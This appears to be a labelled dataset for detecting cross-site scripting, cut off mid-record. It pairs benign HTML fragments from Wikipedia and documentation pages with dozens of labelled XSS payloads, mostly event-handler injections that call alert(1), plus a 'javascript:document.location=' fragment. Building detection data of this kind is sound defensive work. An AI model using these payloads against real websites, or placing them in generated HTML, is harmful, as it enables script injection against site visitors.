#   'Sentence': '<li><a href="/wiki/File:Socrates.png" class="image"><img alt="Socrates.png" src="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png" decoding="async" width="18" height="28" class="noviewer" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x" data-file-width="326" data-file-height="500" /> </a> <a href="/wiki/Portal:Philosophy" title="Portal:Philosophy">Philosophy&#32;portal </a> </li> </ul>',
#   'Label': 0},
#  {'Unnamed: 0': 1,
#   'Sentence': '<tt onmouseover="alert(1)">test</tt>',
#   'Label': 1},
#  {'Unnamed: 0': 2,
#   'Sentence': '\t </span> <span class="reference-text">Steering for the 1995 "<a href="/wiki/History_of_autonomous_cars#1990s" class="mw-redirect" title="History of autonomous cars">No Hands Across America </a>" required "only a few human assists". ',
#   'Label': 0},
#  {'Unnamed: 0': 3,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation web"><a rel="nofollow" class="external text" href="https://www.mileseducation.com/finance/artificial_intelligence">"Miles Education | Future Of Finance | Blockchain Fundamentals for F&amp;A Professionals Certificate" </a>. <i>www.mileseducation.com </i><span class="reference-accessdate">. Retrieved <span class="nowrap">26 September ',
#   'Label': 0},
#  {'Unnamed: 0': 4,
#   'Sentence': '\t </span>. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1016%2FS0921-8890%2805%2980025-9">10.1016/S0921-8890(05)80025-9 </a>. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20070809020912/http://people.csail.mit.edu/brooks/papers/elephants.pdf">Archived </a> <span class="cs1-format">(PDF) ',
#   'Label': 0},
#  {'Unnamed: 0': 5,
#   'Sentence': '<li id="cite_note-118"><span class="mw-cite-backlink"><b><a href="#cite_ref-118">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 6,
#   'Sentence': '<li><a href="/wiki/Contextualism" title="Contextualism">Contextualism </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 7,
#   'Sentence': '<li id="cite_note-Representing_causation-95"><span class="mw-cite-backlink">^ <a href="#cite_ref-Representing_causation_95-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-Representing_causation_95-1"><sup><i><b>b </b> </i> </sup> </a> ',
#   'Label': 0},
#  {'Unnamed: 0': 8,
#   'Sentence': ' <tr><td class="plainlist" style="padding:0 0.1em 0.4em">',
#   'Label': 0},
#  {'Unnamed: 0': 9, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 10,
#   'Sentence': '<li><a href="/wiki/Mind%E2%80%93body_problem" title="Mind–body problem">Mind–body problem </a>',
#   'Label': 0},
#  {'Unnamed: 0': 11,
#   'Sentence': '<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 12,
#   'Sentence': '<col draggable="true" ondragenter="alert(1)">test</col>',
#   'Label': 1},
#  {'Unnamed: 0': 13,
#   'Sentence': '<caption onpointerdown=alert(1)>XSS</caption>',
#   'Label': 1},
#  {'Unnamed: 0': 14, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 15,
#   'Sentence': '\t </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 16,
#   'Sentence': '<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 17,
#   'Sentence': '<style onmouseleave="alert(1)">test</style>',
#   'Label': 1},
#  {'Unnamed: 0': 18,
#   'Sentence': '<svg><meta onload=alert(1)></meta>',
#   'Label': 1},
#  {'Unnamed: 0': 19,
#   'Sentence': '<li><a href="/wiki/Programming_language" title="Programming language">Programming language </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 20,
#   'Sentence': '<figcaption onpointerleave=alert(1)>XSS</figcaption>',
#   'Label': 1},
#  {'Unnamed: 0': 21,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation news"><a rel="nofollow" class="external text" href="https://www.economist.com/news/special-report/21700756-artificial-intelligence-boom-based-old-idea-modern-twist-not">"From not working to neural networking" </a>. <i>The Economist </i>. 2016<span class="reference-accessdate">. Retrieved <span class="nowrap">26 April ',
#   'Label': 0},
#  {'Unnamed: 0': 22, 'Sentence': '</div>', 'Label': 0},
#  {'Unnamed: 0': 23,
#   'Sentence': '<datalist id=x tabindex=1 onfocusin=alert(1)></datalist>',
#   'Label': 1},
#  {'Unnamed: 0': 24,
#   'Sentence': '<input type=image src=1 onerror=alert(1)>',
#   'Label': 1},
#  {'Unnamed: 0': 25,
#   'Sentence': '<strong ondblclick="alert(1)">test</strong>',
#   'Label': 1},
#  {'Unnamed: 0': 26,
#   'Sentence': '<li><a href="/wiki/Computer_data_storage" title="Computer data storage">Information storage systems </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 27,
#   'Sentence': '<div draggable="true" contenteditable>drag me</div><input ondragover=alert(1) contenteditable>drop here</input>',
#   'Label': 1},
#  {'Unnamed: 0': 28,
#   'Sentence': '\t </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 29,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation journal"><a href="/wiki/Woody_Evans" title="Woody Evans">Evans, Woody </a> (2015). "Posthuman Rights: Dimensions of Transhuman Worlds". <i>Teknokultura </i>. <b>12 </b> (2). <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.5209%2Frev_TK.2015.v12.n2.49072">10.5209/rev_TK.2015.v12.n2.49072 </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Teknokultura&amp;rft.atitle=Posthuman+Rights%3A+Dimensions+of+Transhuman+Worlds&amp;rft.volume=12&amp;rft.issue=2&amp;rft.date=2015&amp;rft_id=info%3Adoi%2F10.5209%2Frev_TK.2015.v12.n2.49072&amp;rft.aulast=Evans&amp;rft.aufirst=Woody&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 30,
#   'Sentence': '<spacer onkeypress="alert(1)" contenteditable>test</spacer>',
#   'Label': 1},
#  {'Unnamed: 0': 31,
#   'Sentence': '<li><cite id="CITEREFOudeyer2010" class="citation journal">Oudeyer, P-Y. (2010). <a rel="nofollow" class="external text" href="http://www.pyoudeyer.com/IEEETAMDOudeyer10.pdf">"On the impact of robotics in behavioral and cognitive sciences: from insect navigation to human cognitive development" </a> <span class="cs1-format">(PDF) ',
#   'Label': 0},
#  {'Unnamed: 0': 32,
#   'Sentence': '<style>@keyframes slidein {}</style><center style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></center>',
#   'Label': 1},
#  {'Unnamed: 0': 33,
#   'Sentence': '<pre draggable="true" ondragend="alert(1)">test</pre>',
#   'Label': 1},
#  {'Unnamed: 0': 34, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 35,
#   'Sentence': '<li><a href="#CITEREFNilsson1998">Nilsson 1998 </a>, chpt. 8 </li> </ul>',
#   'Label': 0},
#  {'Unnamed: 0': 36,
#   'Sentence': '<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 37,
#   'Sentence': '<style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>',
#   'Label': 1},
#  {'Unnamed: 0': 38,
#   'Sentence': '<article draggable="true" ondrag="alert(1)">test</article>',
#   'Label': 1},
#  {'Unnamed: 0': 39,
#   'Sentence': '<li><a href="/wiki/Computational_physics" title="Computational physics">Computational physics </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 40,
#   'Sentence': '\t </span>. <i>Behavioral and Brain Sciences </i>. <b>3 </b> (3): 417–457. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1017%2FS0140525X00005756">10.1017/S0140525X00005756 </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Behavioral+and+Brain+Sciences&amp;rft.atitle=Minds%2C+Brains+and+Programs&amp;rft.volume=3&amp;rft.issue=3&amp;rft.pages=417-457&amp;rft.date=1980&amp;rft_id=info%3Adoi%2F10.1017%2FS0140525X00005756&amp;rft.aulast=Searle&amp;rft.aufirst=John&amp;rft_id=http%3A%2F%2Fcogprints.org%2F7150%2F1%2F10.1.1.83.5248.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 41,
#   'Sentence': '<rtc draggable="true" ondragleave="alert(1)">test</rtc>',
#   'Label': 1},
#  {'Unnamed: 0': 42,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation journal">Prakken, Henry (31 August 2017). "On the problem of making autonomous vehicles conform to traffic law". <i>Artificial Intelligence and Law </i>. <b>25 </b> (3): 341–363. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1007%2Fs10506-017-9210-0">10.1007/s10506-017-9210-0 </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Artificial+Intelligence+and+Law&amp;rft.atitle=On+the+problem+of+making+autonomous+vehicles+conform+to+traffic+law&amp;rft.volume=25&amp;rft.issue=3&amp;rft.pages=341-363&amp;rft.date=2017-08-31&amp;rft_id=info%3Adoi%2F10.1007%2Fs10506-017-9210-0&amp;rft.aulast=Prakken&amp;rft.aufirst=Henry&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 43,
#   'Sentence': '\t </span><span class="mw-editsection"><span class="mw-editsection-bracket">[ ',
#   'Label': 0},
#  {'Unnamed: 0': 44,
#   'Sentence': '\t<sup id="cite_ref-Biological_intelligence_vs._intelligence_in_general_16-1" class="reference"><a href="#cite_note-Biological_intelligence_vs._intelligence_in_general-16">&#91;16&#93; </a> </sup>',
#   'Label': 0},
#  {'Unnamed: 0': 45,
#   'Sentence': '\t\t\t<div class="thumbcaption">',
#   'Label': 0},
#  {'Unnamed: 0': 46,
#   'Sentence': '<li id="cite_note-recurse-409"><span class="mw-cite-backlink"><b><a href="#cite_ref-recurse_409-0">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 47,
#   'Sentence': '<div draggable="true" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>',
#   'Label': 1},
#  {'Unnamed: 0': 48, 'Sentence': '\t\t </div>', 'Label': 0},
#  {'Unnamed: 0': 49,
#   'Sentence': '<li><a href="/wiki/Glossary_of_calculus" title="Glossary of calculus">Calculus </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 50,
#   'Sentence': '<frame oncut="alert(1)" contenteditable>test</frame>',
#   'Label': 1},
#  {'Unnamed: 0': 51, 'Sentence': '<ul class="simple">', 'Label': 0},
#  {'Unnamed: 0': 52,
#   'Sentence': '<frameset onmouseover="alert(1)">test</frameset>',
#   'Label': 1},
#  {'Unnamed: 0': 53,
#   'Sentence': '<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>',
#   'Label': 1},
#  {'Unnamed: 0': 54,
#   'Sentence': '<h4><span class="mw-headline" id="Technological_singularity">Technological singularity ',
#   'Label': 0},
#  {'Unnamed: 0': 55, 'Sentence': '\t </span>(1700) </li>', 'Label': 0},
#  {'Unnamed: 0': 56,
#   'Sentence': '<iframe onload=alert(1)></iframe>',
#   'Label': 1},
#  {'Unnamed: 0': 57,
#   'Sentence': '<strong draggable="true" ondragstart="alert(1)">test</strong>',
#   'Label': 1},
#  {'Unnamed: 0': 58, 'Sentence': '\t </span> </h3>', 'Label': 0},
#  {'Unnamed: 0': 59,
#   'Sentence': '<li id="cite_note-304"><span class="mw-cite-backlink"><b><a href="#cite_ref-304">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 60,
#   'Sentence': '<!DOCTYPE html><html class="no-js" lang="en" > ',
#   'Label': 0},
#  {'Unnamed: 0': 61,
#   'Sentence': '<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>',
#   'Label': 1},
#  {'Unnamed: 0': 62,
#   'Sentence': '<article onpointerleave=alert(1)>XSS</article>',
#   'Label': 1},
#  {'Unnamed: 0': 63,
#   'Sentence': '<nextid onmousemove="alert(1)">test</nextid>',
#   'Label': 1},
#  {'Unnamed: 0': 64, 'Sentence': 'javascript:document.location=', 'Label': 1},
#  {'Unnamed: 0': 65,
#   'Sentence': '<style>@keyframes x{}</style><area style="animation-name:x" onanimationend="alert(1)"></area>',
#   'Label': 1},
#  {'Unnamed: 0': 66,
#   'Sentence': '<blockquote onpointermove=alert(1)>XSS</blockquote>',
#   'Label': 1},
#  {'Unnamed: 0': 67,
#   'Sentence': '<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 68,
#   'Sentence': '\t <div style="padding:0em 0.25em">',
#   'Label': 0},
#  {'Unnamed: 0': 69,
#   'Sentence': '\t </span><span class="mw-editsection"><span class="mw-editsection-bracket">[ ',
#   'Label': 0},
#  {'Unnamed: 0': 70, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 71,
#   'Sentence': '<style>@keyframes x{}</style><title style="animation-name:x" onanimationend="alert(1)"></title>',
#   'Label': 1},
#  {'Unnamed: 0': 72,
#   'Sentence': '<li><a href="/wiki/Brain%E2%80%93computer_interface" title="Brain–computer interface">Neurocybernetics </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 73,
#   'Sentence': ' </div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">Mathematics<br />of computing </th><td class="navbox-list navbox-odd" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'Label': 0},
#  {'Unnamed: 0': 74,
#   'Sentence': '<h2>Built-in services<a class="headerlink" href="#built-in-services" title="Permalink to this headline">¶</a></h2>',
#   'Label': 0},
#  {'Unnamed: 0': 75,
#   'Sentence': '<noembed onpointerout=alert(1)>XSS</noembed>',
#   'Label': 1},
#  {'Unnamed: 0': 76,
#   'Sentence': '<data onbeforecut="alert(1)" contenteditable>test</data>',
#   'Label': 1},
#  {'Unnamed: 0': 77,
#   'Sentence': '<A HREF="http://ha.ckers.org@google"></A>',
#   'Label': 1},
#  {'Unnamed: 0': 78,
#   'Sentence': '<plaintext oncut="alert(1)" contenteditable>test</plaintext>',
#   'Label': 1},
#  {'Unnamed: 0': 79,
#   'Sentence': '<s onmousedown="alert(1)">test</s>',
#   'Label': 1},
#  {'Unnamed: 0': 80,
#   'Sentence': '<address onkeypress="alert(1)" contenteditable>test</address>',
#   'Label': 1},
#  {'Unnamed: 0': 81,
#   'Sentence': '\t <div style="padding:0em 0.25em">',
#   'Label': 0},
#  {'Unnamed: 0': 82,
#   'Sentence': '<optgroup onmouseover="alert(1)">test</optgroup>',
#   'Label': 1},
#  {'Unnamed: 0': 83,
#   'Sentence': '\t </span> <span class="reference-text">',
#   'Label': 0},
#  {'Unnamed: 0': 84,
#   'Sentence': '\t </span> <span class="reference-text">Celli, Fabio, Pietro Zani Massani, and Bruno Lepri. "Profilio: Psychometric Profiling to Boost Social Media Advertising." Proceedings of the 2017 ACM on Multimedia Conference. ACM, 2017  <a rel="nofollow" class="external autonumber" href="https://www.researchgate.net/publication/320542489_Profilio_Psychometric_Profiling_to_Boost_Social_Media_Advertising">[1] </a> ',
#   'Label': 0},
#  {'Unnamed: 0': 85, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 86,
#   'Sentence': '<li><a href="/wiki/Computability_theory" title="Computability theory">Computability theory </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 87,
#   'Sentence': '<script onmouseover="alert(1)">test</script>',
#   'Label': 1},
#  {'Unnamed: 0': 88,
#   'Sentence': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style="position:absolute;" onanimationcancel="alert(1)"></sub>',
#   'Label': 1},
#  {'Unnamed: 0': 89, 'Sentence': 'testing.</p>', 'Label': 0},
#  {'Unnamed: 0': 90,
#   'Sentence': '<image onclick="alert(1)">test',
#   'Label': 1},
#  {'Unnamed: 0': 91, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 92,
#   'Sentence': '<tfoot onclick="alert(1)">test</tfoot>',
#   'Label': 1},
#  {'Unnamed: 0': 93,
#   'Sentence': '<ul onpointerenter=alert(1)>XSS</ul>',
#   'Label': 1},
#  {'Unnamed: 0': 94,
#   'Sentence': '<bdo draggable="true" ondragenter="alert(1)">test</bdo>',
#   'Label': 1},
#  {'Unnamed: 0': 95,
#   'Sentence': '<li><a href="/wiki/Mind" title="Mind">Mind </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 96,
#   'Sentence': '<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>',
#   'Label': 1},
#  {'Unnamed: 0': 97,
#   'Sentence': '<style>@keyframes slidein {}</style><shadow style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></shadow>',
#   'Label': 1},
#  {'Unnamed: 0': 98,
#   'Sentence': '<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>',
#   'Label': 1},
#  {'Unnamed: 0': 99,
#   'Sentence': '<dd onmouseout="alert(1)">test</dd>',
#   'Label': 1},
#  {'Unnamed: 0': 100, 'Sentence': '<div class="thumb tright">', 'Label': 0},
#  {'Unnamed: 0': 101,
#   'Sentence': '<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 102,
#   'Sentence': '<li><a href="/wiki/Automated_planning_and_scheduling" title="Automated planning and scheduling">Planning </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 103,
#   'Sentence': '\t </span> <span class="reference-text">',
#   'Label': 0},
#  {'Unnamed: 0': 104,
#   'Sentence': '<data draggable="true" ondragstart="alert(1)">test</data>',
#   'Label': 1},
#  {'Unnamed: 0': 105, 'Sentence': '</ul>', 'Label': 0},
#  {'Unnamed: 0': 106,
#   'Sentence': '<li><a href="#CITEREFRussellNorvig2003">Russell &amp; Norvig 2003 </a>, pp.&#160;649–788, </li>',
#   'Label': 0},
#  {'Unnamed: 0': 107,
#   'Sentence': '<li><a href="/wiki/Underdetermination" title="Underdetermination">Underdetermination </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 108,
#   'Sentence': '\t </span> <span class="reference-text"><a href="#CITEREFMcCorduck2004">McCorduck 2004 </a>, pp.&#160;480–483. ',
#   'Label': 0},
#  {'Unnamed: 0': 109, 'Sentence': '\t </span> </h4>', 'Label': 0},
#  {'Unnamed: 0': 110,
#   'Sentence': '        <a href="intro/overview.html" class="btn btn-neutral float-right" title="Scrapy at a glance" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right">',
#   'Label': 0},
#  {'Unnamed: 0': 111,
#   'Sentence': '\t </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=ZDNet&amp;rft.atitle=Half+of+Americans+do+not+believe+deepfake+news+could+target+them+online&amp;rft.aulast=Brown&amp;rft.aufirst=Eileen&amp;rft_id=https%3A%2F%2Fwww.zdnet.com%2Farticle%2Fhalf-of-americans-do-not-believe-deepfake-news-could-target-them-online%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 112,
#   'Sentence': '<sub draggable="true" ondragend="alert(1)">test</sub>',
#   'Label': 1},
#  {'Unnamed: 0': 113,
#   'Sentence': '<li><cite id="CITEREFTuring1950" class="citation"><a href="/wiki/Alan_Turing" title="Alan Turing">Turing, Alan </a> (October 1950), "Computing Machinery and Intelligence", <i><a href="/wiki/Mind_(journal)" title="Mind (journal)">Mind </a> </i>, <b>LIX </b> (236): 433–460, <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1093%2Fmind%2FLIX.236.433">10.1093/mind/LIX.236.433 </a>, <a href="/wiki/International_Standard_Serial_Number" title="International Standard Serial Number">ISSN </a>&#160;<a rel="nofollow" class="external text" href="//www.worldcat.org/issn/0026-4423">0026-4423 </a> </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Mind&amp;rft.atitle=Computing+Machinery+and+Intelligence&amp;rft.volume=LIX&amp;rft.issue=236&amp;rft.pages=433-460&amp;rft.date=1950-10&amp;rft_id=info%3Adoi%2F10.1093%2Fmind%2FLIX.236.433&amp;rft.issn=0026-4423&amp;rft.aulast=Turing&amp;rft.aufirst=Alan&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 114,
#   'Sentence': '<dialog draggable="true" ondragenter="alert(1)">test</dialog>',
#   'Label': 1},
#  {'Unnamed: 0': 115,
#   'Sentence': '<iframe onblur=alert(1) id=x><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 116,
#   'Sentence': '<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 117,
#   'Sentence': '        <script src="_static/js/hoverxref.js"></script>',
#   'Label': 0},
#  {'Unnamed: 0': 118, 'Sentence': '\t </span>(2014) </li>', 'Label': 0},
#  {'Unnamed: 0': 119,
#   'Sentence': 'Refuting Mathematical Objection:',
#   'Label': 0},
#  {'Unnamed: 0': 120, 'Sentence': '\t </span> </li>', 'Label': 0},
#  {'Unnamed: 0': 121, 'Sentence': '\t </span> </li>', 'Label': 0},
#  {'Unnamed: 0': 122,
#   'Sentence': '<meter id=x tabindex=1 onbeforedeactivate=alert(1)></meter><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 123, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 124,
#   'Sentence': '<li><a href="/wiki/Philosophy_of_computer_science" title="Philosophy of computer science">Computer science </a> </li> </ul> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 125,
#   'Sentence': '<em draggable="true" ondragleave="alert(1)">test</em>',
#   'Label': 1},
#  {'Unnamed: 0': 126, 'Sentence': '\t </span> </h4>', 'Label': 0},
#  {'Unnamed: 0': 127,
#   'Sentence': '<small onbeforecut="alert(1)" contenteditable>test</small>',
#   'Label': 1},
#  {'Unnamed: 0': 128,
#   'Sentence': '<article draggable="true" ondragstart="alert(1)">test</article>',
#   'Label': 1},
#  {'Unnamed: 0': 129,
#   'Sentence': '<cite onkeyup="alert(1)" contenteditable>test</cite>',
#   'Label': 1},
#  {'Unnamed: 0': 130,
#   'Sentence': '<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 131,
#   'Sentence': '<data onpointerleave=alert(1)>XSS</data>',
#   'Label': 1},
#  {'Unnamed: 0': 132,
#   'Sentence': '<audio draggable="true" ondragend="alert(1)">test</audio>',
#   'Label': 1},
#  {'Unnamed: 0': 133, 'Sentence': '\t </span>(2012) </li>', 'Label': 0},
#  {'Unnamed: 0': 134,
#   'Sentence': '<li><a href="/wiki/Juggling_robot" title="Juggling robot">Juggling </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 135,
#   'Sentence': '<li id="cite_note-FOOTNOTEWengMcClellandPentlandSporns2001-168"><span class="mw-cite-backlink"><b><a href="#cite_ref-FOOTNOTEWengMcClellandPentlandSporns2001_168-0">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 136,
#   'Sentence': '<dd onbeforecopy="alert(1)" contenteditable>test</dd>',
#   'Label': 1},
#  {'Unnamed: 0': 137, 'Sentence': '\t </span> </li>', 'Label': 0},
#  {'Unnamed: 0': 138,
#   'Sentence': '<del id=x tabindex=1 onactivate=alert(1)></del>',
#   'Label': 1},
#  {'Unnamed: 0': 139,
#   'Sentence': '<svg onbeforecut="alert(1)" contenteditable>test</svg>',
#   'Label': 1},
#  {'Unnamed: 0': 140,
#   'Sentence': '<li id="cite_note-262"><span class="mw-cite-backlink"><b><a href="#cite_ref-262">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 141,
#   'Sentence': '<li class="toclevel-2 tocsection-15"><a href="#Cybernetics_and_brain_simulation"><span class="tocnumber">5.1 ',
#   'Label': 0},
#  {'Unnamed: 0': 142,
#   'Sentence': '<optgroup onpointerover=alert(1)>XSS</optgroup>',
#   'Label': 1},
#  {'Unnamed: 0': 143, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 144,
#   'Sentence': '             </li><li style="min-height: 31px;"><span style="display: inline-block; width: 31px; line-height: 31px; vertical-align: middle; text-align: center;"><img alt="" src="//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/27px-Wikibooks-logo.svg.png" decoding="async" width="27" height="27" style="vertical-align: middle" srcset="//upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/41px-Wikibooks-logo.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Wikibooks-logo.svg/54px-Wikibooks-logo.svg.png 2x" data-file-width="300" data-file-height="300" /> ',
#   'Label': 0},
#  {'Unnamed: 0': 145,
#   'Sentence': '<audio onpointermove=alert(1)>XSS</audio>',
#   'Label': 1},
#  {'Unnamed: 0': 146,
#   'Sentence': '<aside onmouseout="alert(1)">test</aside>',
#   'Label': 1},
#  {'Unnamed: 0': 147, 'Sentence': '\t <div>', 'Label': 0},
#  {'Unnamed: 0': 148,
#   'Sentence': '<li><a href="/wiki/Viv_(software)" title="Viv (software)">Viv </a><span class="nowrap">&#160; ',
#   'Label': 0},
#  {'Unnamed: 0': 149, 'Sentence': '\t </span> </a> </li>', 'Label': 0},
#  {'Unnamed: 0': 150,
#   'Sentence': '<canvas onbeforecut="alert(1)" contenteditable>test</canvas>',
#   'Label': 1},
#  {'Unnamed: 0': 151, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 152,
#   'Sentence': '\t </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 153, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 154,
#   'Sentence': '<div draggable="true" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>',
#   'Label': 1},
#  {'Unnamed: 0': 155,
#   'Sentence': '<tbody draggable="true" ondragenter="alert(1)">test</tbody>',
#   'Label': 1},
#  {'Unnamed: 0': 156,
#   'Sentence': '\t </span><a href="/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=48" title="Edit section: Philosophy and ethics">edit </a><span class="mw-editsection-bracket">] ',
#   'Label': 0},
#  {'Unnamed: 0': 157,
#   'Sentence': '<li id="cite_note-Robotic_mapping-131"><span class="mw-cite-backlink"><b><a href="#cite_ref-Robotic_mapping_131-0">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 158,
#   'Sentence': '<object onmousedown="alert(1)">test</object>',
#   'Label': 1},
#  {'Unnamed: 0': 159,
#   'Sentence': '<area onbeforepaste="alert(1)" contenteditable>test</area>',
#   'Label': 1},
#  {'Unnamed: 0': 160, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 161,
#   'Sentence': '<ul><li><a href="#CITEREFKurzweil1999">Kurzweil 1999 </a> and <a href="#CITEREFKurzweil2005">Kurzweil 2005 </a> </li> </ul>',
#   'Label': 0},
#  {'Unnamed: 0': 162,
#   'Sentence': '<template onpointerout=alert(1)>XSS</template>',
#   'Label': 1},
#  {'Unnamed: 0': 163,
#   'Sentence': '\t </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> ',
#   'Label': 0},
#  {'Unnamed: 0': 164,
#   'Sentence': '<s onpointerup=alert(1)>XSS</s>',
#   'Label': 1},
#  {'Unnamed: 0': 165,
#   'Sentence': '<select draggable="true" ondrag="alert(1)">test</select>',
#   'Label': 1},
#  {'Unnamed: 0': 166,
#   'Sentence': '<a onmouseup="alert(1)">test</a>',
#   'Label': 1},
#  {'Unnamed: 0': 167,
#   'Sentence': ' </div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">Related techniques </th><td class="navbox-list navbox-odd hlist" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'Label': 0},
#  {'Unnamed: 0': 168,
